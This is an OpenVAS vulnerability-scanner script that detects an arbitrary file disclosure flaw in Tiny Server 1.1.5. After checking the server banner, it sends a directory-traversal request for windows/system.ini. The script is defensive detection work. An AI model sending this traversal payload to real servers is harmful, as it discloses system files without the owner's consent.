###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tiny_server_file_disc_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Tiny Server Arbitrary File Disclosure Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Tiny Server version 1.1.5";
tag_insight = "The flaw is due to an input validation error in application, which
  allows attackers to read arbitrary files via a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 20th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://tinyserver.sourceforge.net/";
tag_summary = "This host is running Tiny Server and is prone to arbitrary file
  disclosure vulnerability.";

if(description)
{
  script_id(802721);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-21 10:53:33 +0530 (Wed, 21 Mar 2012)");
  script_name("Tiny Server Arbitrary File Disclosure Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18610/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110912/tinyserver-disclose.txt");

  script_description(desc);
  script_summary("Check if Tiny Server is prone to file disclosure vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
url = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check port state
if(!get_port_state(port)) {
  exit(0);
}

## Get the banner
banner = get_http_banner(port:port);
if(!banner || "Server: TinyServer" >!< banner){
  exit(0);
}

## Send the attack
url = "/../../../../../../../../../../../../../windows/system.ini";

if(http_vuln_check(port:port, url:url, pattern:"\[drivers\]")){
  security_warning(port);
}
